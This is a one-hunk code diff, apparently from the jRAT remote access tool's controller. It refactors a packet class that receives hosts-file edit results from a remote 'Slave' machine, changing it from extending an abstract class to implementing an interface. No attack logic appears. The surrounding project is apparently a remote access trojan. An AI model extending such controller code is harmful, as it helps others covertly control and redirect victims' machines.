@@ -7,7 +7,7 @@ import jrat.controller.ui.panels.PanelControlHostsFile;
 import javax.swing.*;
 
 
-public class Packet39HostEditResult extends AbstractIncomingPacket {
+public class Packet39HostEditResult implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
